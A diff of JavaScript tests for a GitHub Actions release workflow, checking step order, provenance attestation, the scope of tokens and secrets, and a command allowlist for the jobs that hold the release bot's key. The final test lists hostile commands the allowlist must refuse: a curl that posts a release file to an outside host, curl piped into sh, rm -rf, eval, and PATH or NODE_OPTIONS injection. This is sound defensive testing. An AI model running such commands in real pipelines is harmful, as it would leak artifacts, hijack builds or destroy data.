+  yamlTest("assemble downloads and assembles before any token exists, attests, then makes the token, uploads to the draft, checks it, and hands the release to the smoke", () => {
+    const steps = releaseStepsOf("assemble");
+    const at = (found) => steps.findIndex(found);
+    const order = [
+      at((step) => usesAction(step, "actions/download-artifact")),
+      at((step) => scriptOf(step).includes("assemble.mjs")),
+      at((step) => usesAction(step, "actions/attest-build-provenance")),
+      at((step) => usesAction(step, "actions/create-github-app-token")),
+      at((step) => scriptOf(step).includes("gh release upload")),
+      at((step) => scriptOf(step).includes("release-assets.mjs expected")),
+      at((step) => usesAction(step, "actions/upload-artifact")),
+    ];
+    assert.ok(order.every((i, n) => i !== -1 && (n === 0 || i > order[n - 1])), `assemble's steps are out of order: ${order.join(", ")}`);
+    assert.equal(order.at(-1), steps.length - 1, "the release is handed to the smoke last");
+  });
+
+  yamlTest("the build provenance is attested in a job of release.yml itself, the only attestation of any workflow", () => {
+    // An attestation names the workflow whose job made it as its signer. Made
+    // in a workflow release.yml calls, it would name that one, and gh
+    // attestation verify --signer-workflow …/release.yml would refuse it.
+    const attests = workflowJobs().flatMap(({ rel, id, job }) =>
+      (job.steps ?? []).filter((step) => /^actions\/attest(-build-provenance)?@/.test(String(step.uses ?? ""))).map((step) => ({ rel, id, step })),
+    );
+    assert.deepEqual(attests.map(({ rel, id }) => `${rel}, job ${id}`), [`${RELEASE}, job assemble`]);
+    const [{ step }] = attests;
+    assert.ok(usesAction(step, "actions/attest-build-provenance"));
+    assert.deepEqual(step.with, { "subject-path": "release/*" });
+    const job = jobOf(RELEASE, "assemble");
+    assert.equal(job.uses, undefined, "assemble must be a job of release.yml, not a call of another workflow");
+    assert.deepEqual(job.permissions, { contents: "read", "id-token": "write", attestations: "write" });
+    for (const [id, other] of Object.entries(workflow(RELEASE).jobs ?? {})) {
+      if (id !== "assemble") assert.equal(other.permissions, undefined, `job ${id} widens its permissions`);
+    }
+  });
+
+  scriptTest("assemble uploads the assembled files to the draft, and to nothing but a draft", () => {
+    // A published release's files are public: they stay as they are.
+    const step = releaseStep("assemble", "gh release upload");
+    const files = expectedAssets("1.2.3");
+    const run = (isDraft) => runReleaseStep(step, { env: RELEASE_ENV, files, release: { tagName: "v1.2.3", isDraft, assets: [] } });
+    const draft = run(true);
+    assert.equal(draft.status, 0, draft.output);
+    assert.equal(draft.gh.length, 2, draft.gh.join("\n"));
+    assert.equal(draft.gh[0], "release view v1.2.3 --json isDraft --jq .isDraft");
+    const uploaded = draft.gh[1].split(" ");
+    assert.deepEqual([...uploaded.slice(0, 3), uploaded.at(-1)], ["release", "upload", "v1.2.3", "--clobber"]);
+    assert.deepEqual(uploaded.slice(3, -1).sort(), files.map((name) => `release/${name}`).sort());
+    const published = run(false);
+    assert.equal(published.status, 1, published.output);
+    assert.match(published.output, /::error::v1\.2\.3 is published already/);
+    assert.deepEqual(published.gh, ["release view v1.2.3 --json isDraft --jq .isDraft"]);
+  });
+
+  jqScriptTest("assemble's check passes a draft that holds exactly expectedAssets(), each uploaded in full, and fails one with an asset missing, extra or cut short", () => {
+    const step = releaseStep("assemble", "release-assets.mjs expected");
+    const expected = expectedAssets("1.2.3");
+    const asset = (name, state = "uploaded") => ({ name, state, size: 1 });
+    const check = (assets) => runReleaseStep(step, { env: RELEASE_ENV, release: { tagName: "v1.2.3", isDraft: true, assets } });
+    // In whatever order GitHub lists them.
+    const good = check([...expected].reverse().map((name) => asset(name)));
+    assert.equal(good.status, 0, good.output);
+    for (const [why, assets] of [
+      ["one missing", expected.slice(1).map((name) => asset(name))],
+      ["one more", [...expected, "Fleetify_1.2.2_x64-setup.exe"].map((name) => asset(name))],
+      ["one still uploading", expected.map((name, i) => asset(name, i === 0 ? "open" : "uploaded"))],
+      ["another version's", expectedAssets("1.2.2").map((name) => asset(name))],
+      ["none", []],
+    ]) {
+      const result = check(assets);
+      assert.equal(result.status, 1, `${why}:\n${result.output}`);
+      assert.match(result.output, /::error::the draft v1\.2\.3 doesn't hold exactly the release's assets/, why);
+    }
+  });
+
+  yamlTest("smoke runs smoke.yml on the assembled release, with no update to rehearse, against the pinned designated requirement", () => {
+    // A release build's updater asks only the shipped endpoints.
+    const smoke = jobOf(RELEASE, "smoke");
+    assert.equal(smoke.uses, "./.github/workflows/smoke.yml");
+    assert.deepEqual([smoke.needs].flat().sort(), ["assemble", "release-please"]);
+    assert.deepEqual(smoke.with, { version: fromReleasePlease("version"), rehearse: false, "expected-dr": DR_FILE });
+    assert.ok(existsSync(join(ROOT, DR_FILE)), `${DR_FILE} is missing`);
+  });
+
+  yamlTest("publish waits for assemble and smoke, then publishes the draft as the latest release, and checks it", () => {
+    const job = jobOf(RELEASE, "publish");
+    const needs = [job.needs].flat();
+    assert.deepEqual(["release-please", "assemble", "smoke"].filter((need) => !needs.includes(need)), [], "publish must need release-please, assemble and smoke");
+    assert.equal(job["runs-on"], "ubuntu-24.04");
+    assert.deepEqual(job.env, { TAG: fromReleasePlease("tag_name"), VERSION: fromReleasePlease("version"), SHA: fromReleasePlease("sha"), GH_REPO: "${{ github.repository }}" });
+    const steps = releaseStepsOf("publish");
+    const publish = releaseStep("publish", "gh release edit");
+    // Publishing the draft makes its tag, as the Release Bot.
+    assert.deepEqual(commandLines(publish), ['gh release edit "$TAG" --draft=false --latest']);
+    const after = steps.slice(steps.indexOf(publish) + 1).map(scriptOf).join("\n");
+    for (const text of ['gh release view "$TAG" --json isDraft,tagName', "gh release view --json tagName", "git ls-remote --tags", "curl -fsSL"]) {
+      assert.ok(after.includes(text), `publish doesn't check, once it has published: ${text}`);
+    }
+  });
+
+  yamlTest("publish checks the latest.json that installed copies ask GitHub for: tauri.conf.json's second update endpoint", () => {
+    const step = releaseStep("publish", "curl -fsSL");
+    const urls = simpleCommands(scriptOf(step)).flatMap(({ assignments }) => assignments).filter(({ name }) => name === "url").map(({ value }) => value);
+    const endpoints = JSON.parse(read("src-tauri/tauri.conf.json")).plugins.updater.endpoints;
+    assert.equal(endpoints.length, 2, "tauri.conf.json's updater has two endpoints: fleetify.dev's, then GitHub's");
+    assert.deepEqual(urls, [endpoints[1]]);
+  });
+
+  jqScriptTest("publish's checks pass a published, latest release, tagged at the draft's commit, whose latest.json names its version, and fail anything else", () => {
+    const published = releaseStep("publish", "--json isDraft,tagName");
+    const release = (isDraft) => ({ tagName: "v1.2.3", isDraft, assets: [] });
+    const latest = (tagName) => ({ tagName, isDraft: false, assets: [] });
+    const good = runReleaseStep(published, { env: RELEASE_ENV, release: release(false), latest: latest("v1.2.3") });
+    assert.equal(good.status, 0, good.output);
+    // Each case breaks one check alone.
+    for (const [why, options] of [
+      ["still a draft", { release: release(true), latest: latest("v1.2.3") }],
+      ["not the latest", { release: release(false), latest: latest("v1.2.2") }],
+      ["no such release", { release: release(false), latest: latest("v1.2.3"), tag: "v9.9.9" }],
+    ]) {
+      const result = runReleaseStep(published, { env: RELEASE_ENV, ...options });
+      assert.equal(result.status, 1, `${why}:\n${result.output}`);
+    }
+
+    const tag = releaseStep("publish", "git ls-remote");
+    const listed = (commit, ref = "refs/tags/v1.2.3") => `${commit}\t${ref}`;
+    const tagged = runReleaseStep(tag, { env: { ...RELEASE_ENV, STUB_LS_REMOTE: listed(DRAFT_COMMIT) } });
+    assert.equal(tagged.status, 0, tagged.output);
+    assert.deepEqual(tagged.git, ["ls-remote --tags https://github.com/fleetifydev/fleetify refs/tags/v1.2.3"]);
+    for (const [why, line] of [
+      ["no tag", ""],
+      ["a tag at another commit", listed("f".repeat(40))],
+      ["another tag", listed(DRAFT_COMMIT, "refs/tags/v1.2.3-rc")],
+    ]) {
+      const result = runReleaseStep(tag, { env: { ...RELEASE_ENV, STUB_LS_REMOTE: line } });
+      assert.equal(result.status, 1, `${why}:\n${result.output}`);
+      assert.match(result.output, /::error::the tag v1\.2\.3 isn't at /, why);
+    }
+
+    const manifest = releaseStep("publish", "curl -fsSL");
+    const json = (version) => `${JSON.stringify({ version, notes: "", pub_date: "2026-11-21T10:00:00.000Z", platforms: {} }, null, 2)}\n`;
+    const served = runReleaseStep(manifest, { env: RELEASE_ENV, served: [json("1.2.3")] });
+    assert.equal(served.status, 0, served.output);
+    assert.deepEqual([served.curl.length, served.sleep.length], [1, 0]);
+    // GitHub's latest-release address can take a moment to follow.
+    const late = runReleaseStep(manifest, { env: RELEASE_ENV, served: [json("1.2.2"), null, json("1.2.3")] });
+    assert.equal(late.status, 0, late.output);
+    assert.deepEqual([late.curl.length, late.sleep], [3, ["10", "10"]], "it tries again ten seconds later");
+    for (const [why, bodies] of [
+      ["the previous version's", [json("1.2.2")]],
+      ["none", [null]],
+      ["not JSON", ["<html></html>\n"]],
+    ]) {
+      const result = runReleaseStep(manifest, { env: RELEASE_ENV, served: bodies });
+      assert.equal(result.status, 1, `${why}:\n${result.output}`);
+      assert.match(result.output, /::error::https:\/\/github\.com\/fleetifydev\/fleetify\/releases\/latest\/download\/latest\.json names .*, not 1\.2\.3/, why);
+      assert.deepEqual([result.curl.length, result.sleep], [12, Array(11).fill("10")], `${why}: it gives up after twelve tries, ten seconds apart`);
+    }
+  });
+
+  yamlTest("every gh command gets GH_TOKEN from the Release Bot's token its own job made, never the workflow's own token, and no other step gets a token", () => {
+    // The workflow's own token can't see a draft, let alone publish one.
+    const flow = workflow(RELEASE);
+    const problems = [];
+    const expressions = [...read(RELEASE).matchAll(/\$\{\{([\s\S]*?)\}\}/g)].map(([whole]) => whole);
+    for (const expression of expressions.filter((text) => /GITHUB_TOKEN|\bgithub\s*\.\s*token\b/i.test(text))) problems.push(`release.yml reads the workflow's own token: ${expression}`);
+    for (const [where, env] of [["the workflow", flow.env], ...Object.entries(flow.jobs ?? {}).map(([id, job]) => [`job ${id}`, job.env])]) {
+      const names = Object.keys(env ?? {}).filter((name) => /TOKEN/i.test(name));
+      if (names.length > 0) problems.push(`${where} gives every step ${names.join(", ")}`);
+    }
+    let ghSteps = 0;
+    for (const [id, job] of Object.entries(flow.jobs ?? {})) {
+      const steps = job.steps ?? [];
+      for (const [i, step] of steps.entries()) {
+        const where = `job ${id}, ${stepLabel(step, i)}`;
+        const names = Object.keys(step.env ?? {}).filter((name) => /TOKEN/i.test(name));
+        if (!runsGh(step)) {
+          if (names.length > 0) problems.push(`${where} gets ${names.join(", ")} and runs no gh`);
+          continue;
+        }
+        ghSteps += 1;
+        const tokens = steps.slice(0, i).filter((earlier) => usesAction(earlier, "actions/create-github-app-token")).map((earlier) => `\${{ steps.${earlier.id}.outputs.token }}`);
+        if (!tokens.includes(step.env?.GH_TOKEN)) problems.push(`${where} runs gh with GH_TOKEN ${step.env?.GH_TOKEN ?? "unset"}, not the Release Bot's token from an earlier step of its job`);
+        if (names.some((name) => name !== "GH_TOKEN")) problems.push(`${where} gets ${names.join(", ")}`);
+      }
+    }
+    assert.deepEqual(problems, [], problems.join("\n"));
+    assert.ok(ghSteps >= 4, `release.yml runs gh in ${ghSteps} steps; it uploads, checks the draft, publishes and checks the release`);
+  });
+
+  yamlTest("the Release Bot's key reaches only release.yml's release-please, assemble and publish jobs, in the release-bot environment, and only through their token steps", () => {
+    // The environment lets only main deploy to it: no workflow on another
+    // branch or pull request can read the key.
+    const problems = [];
+    const readers = [];
+    for (const { rel, workflow: flow } of workflows()) {
+      if (JSON.stringify(flow.env ?? {}).includes(RELEASE_BOT_KEY)) problems.push(`${rel}'s env reads ${RELEASE_BOT_KEY}`);
+      for (const [id, job] of Object.entries(flow.jobs ?? {})) {
+        if (!JSON.stringify(job).includes(RELEASE_BOT_KEY)) continue;
+        readers.push(`${rel}, job ${id}`);
+        if (job.environment !== "release-bot") problems.push(`${rel}, job ${id}, reads ${RELEASE_BOT_KEY} in the environment ${JSON.stringify(job.environment ?? "none")}, not release-bot`);
+      }
+    }
+    assert.deepEqual(problems, [], problems.join("\n"));
+    assert.deepEqual(readers.sort(), RELEASE_BOT_JOBS.map((id) => `${RELEASE}, job ${id}`).sort());
+    // In release.yml, the key is the only secret, and only a token step reads it.
+    const flow = workflow(RELEASE);
+    if (secretExpressions(JSON.stringify(flow.env ?? {})).length > 0) problems.push("release.yml's env reads a secret");
+    for (const [id, job] of Object.entries(flow.jobs ?? {})) {
+      const { steps = [], ...settings } = job;
+      if (secretExpressions(JSON.stringify(settings)).length > 0) problems.push(`job ${id} reads a secret outside its steps`);
+      for (const [i, step] of steps.entries()) {
+        const found = secretExpressions(JSON.stringify(step));
+        const asKey = usesAction(step, "actions/create-github-app-token") && step.with?.["private-key"] === `\${{ secrets.${RELEASE_BOT_KEY} }}` && found.length === 1;
+        if (found.length > 0 && !asKey) problems.push(`job ${id}, ${stepLabel(step, i)} reads ${found.join(", ")}`);
+      }
+    }
+    assert.deepEqual(problems, [], problems.join("\n"));
+  });
+
+  yamlTest("each job with the Release Bot's key makes one token, with no more access than the job needs", () => {
+    // release-please: contents for the release and its branch, pull requests
+    // for the release pull request, issues for its labels. assemble and
+    // publish: contents, for the release.
+    for (const [id, permissions] of [
+      ["release-please", ["contents", "pull-requests", "issues"]],
+      ["assemble", ["contents"]],
+      ["publish", ["contents"]],
+    ]) {
+      const tokens = tokenStepsOf(id);
+      assert.equal(tokens.length, 1, `job ${id} must make one token`);
+      assert.deepEqual(tokens[0].with, tokenInputs(permissions), `job ${id}'s token`);
+      assert.equal(typeof tokens[0].id, "string", `job ${id}'s token step needs an id`);
+      assert.equal(jobOf(RELEASE, id).environment, "release-bot", `job ${id}'s environment`);
+    }
+  });
+
+  yamlTest("the jobs with the Release Bot's key run only the actions they need", () => {
+    for (const id of RELEASE_BOT_JOBS) {
+      const used = [...new Set(releaseStepsOf(id).filter((step) => step.uses !== undefined).map((step) => String(step.uses).split("@")[0]))].sort();
+      assert.deepEqual(used, RELEASE_BOT_ACTIONS[id], `job ${id}'s actions`);
+    }
+  });
+
+  yamlTest("the jobs with the Release Bot's key run only gh, git, curl, jq and the release scripts, with bash", () => {
+    const problems = [];
+    let commands = 0;
+    for (const id of RELEASE_BOT_JOBS) {
+      // No other shell: a step's shell: could run its script with anything.
+      if (jobOf(RELEASE, id).defaults !== undefined) problems.push(`job ${id} sets defaults of its own`);
+      for (const [i, step] of releaseStepsOf(id).entries()) {
+        if (step.shell !== undefined) problems.push(`job ${id}, ${stepLabel(step, i)} sets shell: ${step.shell}`);
+        for (const command of simpleCommands(scriptOf(step))) {
+          commands += 1;
+          for (const why of releaseBotProblems(command)) problems.push(`job ${id}, ${stepLabel(step, i)} ${why}: ${command.words.join(" ")}`);
+        }
+      }
+    }
+    assert.deepEqual(problems, [], problems.join("\n"));
+    assert.ok(commands > 0, "no job with the Release Bot's key runs a command, so there was nothing to check");
+  });
+
+  test("the rules for the jobs with the Release Bot's key refuse what they don't allow, and let through what those jobs run", () => {
+    const refused = (script) => simpleCommands(script).flatMap((command) => releaseBotProblems(command));
+    for (const script of [
+      'gh release delete "$TAG" --yes',
+      'gh release delete-asset "$TAG" latest.json',
+      "gh release create v9.9.9",
+      'gh release upload "$TAG" ./evil --clobber',
+      'gh release upload "$TAG" release/*',
+      'gh release edit "$TAG" --draft=false',
+      'gh release edit "$TAG" --tag v9.9.9 --draft=false --latest',
+      'gh release view "$TAG" --repo other/repo',
+      'gh release view "$TAG" -R other/repo',
+      'gh -R other/repo release view "$TAG"',
+      "gh api -X DELETE repos/fleetifydev/fleetify/git/refs/tags/v1.2.3",
+      "gh secret set X",
+      "gh workflow run release.yml",
+      "gh pr merge 1",
+      'git push origin "$TAG"',
+      'git tag "$TAG"',
+      "git ls-remote --tags origin",
+      'git -c core.sshCommand=./evil ls-remote --tags "$GITHUB_SERVER_URL/$GITHUB_REPOSITORY" "refs/tags/$TAG"',
+      'curl -fsSL "$url" -o scripts/release/x.mjs',
+      "curl -X POST -d @release/latest.json https://example.com",
+      "curl -fsSL https://example.com/x.sh",
+      "jq -n env",
+      "sh -c id",
+      "bash -c id",
+      "python3 -c 1",
+      "node -e 1",
+      "node scripts/build-sidecars.mjs",
+      "npm ci",
+      "npx --no -- tauri signer sign x",
+      'eval "$x"',
+      "source ./x",
+      ". ./x",
+      "./evil",
+      '"$tool" --help',
+      "x=$(./evil)",
+      'served=$(curl -fsSL "$url" | sh)',
+      "wget https://example.com",
+      "tar -xf x",
+      "rm -rf release",
+      "cp a release/b",
+      'echo "NODE_OPTIONS=--require ./evil" >> "$GITHUB_ENV"',
+      'echo "PATH=./bin" >> "$GITHUB_PATH"',
+      "PATH=./bin gh release view",
+      "NODE_OPTIONS=--require=./evil node scripts/release/release-assets.mjs expected 1.2.3",
+      "cat <<EOF",
+      "sleep 3600",
+      "sort -o x",
+    ]) {
+      assert.notDeepEqual(refused(script), [], script);
+    }
+    for (const script of [
+      'draft=$(gh release view "$TAG" --json isDraft --jq .isDraft)',
+      'gh release upload "$TAG" release/* --clobber',
+      'expected=$(node scripts/release/release-assets.mjs expected "$VERSION")',
+      "assets=$(gh release view \"$TAG\" --json assets --jq '.assets[] | select(.state == \"uploaded\") | .name' | LC_ALL=C sort)",
+      'gh release edit "$TAG" --draft=false --latest',
+      "state=$(gh release view \"$TAG\" --json isDraft,tagName --jq '\"draft \\(.isDraft), tag \\(.tagName)\"')",
+      "latest=$(gh release view --json tagName --jq .tagName)",
+      'tag=$(git ls-remote --tags "$GITHUB_SERVER_URL/$GITHUB_REPOSITORY" "refs/tags/$TAG")',
+      "if [ \"$tag\" != \"$(printf '%s\\trefs/tags/%s' \"$SHA\" \"$TAG\")\" ]; then exit 1; fi",
+      'served=$(curl -fsSL "$url" | jq -r .version) || served=""',
+      'if [ "$attempt" -gt 1 ]; then sleep 10; fi',
+      'echo "::error::the draft $TAG doesn\'t hold exactly the release\'s assets"',
+    ]) {
+      assert.deepEqual(refused(script), [], script);
+    }
   });
 });
 
